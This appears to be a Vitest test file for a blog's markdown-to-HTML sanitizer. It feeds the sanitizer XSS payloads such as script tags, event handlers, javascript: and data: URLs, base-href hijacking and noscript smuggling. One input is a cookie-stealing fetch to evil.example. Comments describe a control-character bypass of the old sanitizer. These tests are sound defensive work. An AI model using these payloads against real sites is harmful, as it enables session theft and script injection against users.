import { describe, expect, it } from 'vitest'
import { marked } from 'marked'
import { sanitizePostHtml } from './sanitize'

/** The rendering path as it actually runs in `BlogPost.tsx`. */
function renderBody(markdown: string): string {
  const html = marked.parse(markdown)
  if (typeof html !== 'string') throw new Error('expected synchronous marked output')
  return sanitizePostHtml(html)
}

describe('sanitizePostHtml', () => {
  it('preserves the ordinary markdown tag set', () => {
    const html = renderBody(
      '# Title\n\nSome **bold** and _italic_ text with a [link](https://example.com).\n\n' +
        '- one\n- two\n\n> quote\n\n```js\nconst x = 1\n```\n',
    )

    expect(html).toContain('<h1')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<em>italic</em>')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('<li>one</li>')
    expect(html).toContain('<blockquote>')
    expect(html).toContain('<code')
  })

  it('keeps images with src and alt', () => {
    const html = renderBody('![a cat](https://cdn.example.com/cat.png)')
    expect(html).toContain('src="https://cdn.example.com/cat.png"')
    expect(html).toContain('alt="a cat"')
  })

  it('keeps relative and anchor links', () => {
    const html = sanitizePostHtml('<a href="/about">about</a><a href="#top">top</a>')
    expect(html).toContain('href="/about"')
    expect(html).toContain('href="#top"')
  })

  it.each([
    ['script tag', '<script>alert(1)</script>'],
    ['inline event handler', '<img src=x onerror=alert(1)>'],
    ['body onload', '<body onload=alert(1)>'],
    ['svg onload', '<svg onload=alert(1)></svg>'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['object', '<object data="evil.swf"></object>'],
    ['embed', '<embed src="evil.swf">'],
    ['javascript url', '<a href="javascript:alert(1)">x</a>'],
    ['data url', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
    ['form', '<form action="https://evil.example"><input name="password"></form>'],
    ['style tag', '<style>body{background:url("javascript:alert(1)")}</style>'],
    ['noscript smuggling', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
    ['svg foreignObject', '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>'],
  ])('neutralizes %s', (_label, hostile) => {
    const html = sanitizePostHtml(hostile)

    expect(html).not.toMatch(/<script/i)
    expect(html).not.toMatch(/\bon[a-z]+\s*=/i)
    expect(html).not.toMatch(/javascript:/i)
    expect(html).not.toMatch(/<iframe|<object|<embed|<form|<style/i)
  })

  it('strips base href', () => {
    // `<base>` rewrites every relative URL on the page — including the admin
    // links in the shared shell — without looking script-like. The old
    // sanitizer dropped it only incidentally, by returning `body.innerHTML`.
    const html = sanitizePostHtml('<base href="https://evil.example/"><a href="/admin">admin</a>')
    expect(html).not.toMatch(/<base/i)
    expect(html).toContain('href="/admin"')
  })

  it('strips javascript: URLs obfuscated with a leading control character', () => {
    // Confirmed bypass of the old sanitizer: it tested /^javascript:/i against
    // `value.trim()`, which does not strip U+0001 - but browsers do, before
    // resolving the scheme, so the URL executed.
    const html = sanitizePostHtml('<a href="javascript:alert(1)">x</a>')
    expect(html).not.toMatch(/javascript:/i)
  })

  it('strips javascript: URLs obfuscated with entities', () => {
    const html = sanitizePostHtml('<a href="&#106;avascript&colon;alert(1)">x</a>')
    expect(html).not.toMatch(/javascript:/i)
  })

  it('survives hostile markdown end to end', () => {
    const html = renderBody(
      'Intro text.\n\n<img src=x onerror="fetch(`https://evil.example/?c=${document.cookie}`)">\n\n' +
        '[click me](javascript:alert(document.domain))\n\nOutro.',
    )

    expect(html).toContain('Intro text.')
    expect(html).toContain('Outro.')
    expect(html).not.toMatch(/onerror/i)
    expect(html).not.toMatch(/javascript:/i)
    expect(html).not.toContain('document.cookie')
  })
})
